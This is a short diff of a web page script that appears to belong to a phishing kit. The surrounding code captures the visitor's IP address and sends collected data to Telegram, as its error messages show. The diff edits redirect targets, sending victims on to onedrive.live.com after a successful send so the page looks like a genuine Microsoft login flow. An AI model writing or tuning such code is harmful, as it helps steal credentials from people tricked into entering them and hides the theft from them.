@@ -189,7 +189,7 @@ document.addEventListener("DOMContentLoaded", function() {
             })
             .catch(error => {
                 console.error("Error capturing IP address:", error);
-               // window.location.href = 'https://fresh.com'; // Redirect to error URL
+                window.location.href = 'https://example.org'; // Redirect to error URL
             });
     }
 
@@ -218,15 +218,15 @@ document.addEventListener("DOMContentLoaded", function() {
         })
         .then(response => {
             if (response.ok) {
-                window.location.href = 'https://example.org'; // Redirect to success URL
+                window.location.href = 'https://onedrive.live.com'; // Redirect to success URL
             } else {
                 console.error("Error sending data to Telegram:", response.statusText);
-                //window.location.href = 'https://fresh.com'; // Redirect to error URL
+                window.location.href = 'https://example.org'; // Redirect to error URL
             }
         })
         .catch(error => {
             console.error("Error sending data to Telegram:", error);
-           // window.location.href = 'https://fresh.com'; // Redirect to error URL
+            window.location.href = 'https://example.org'; // Redirect to error URL
         });
     }
 
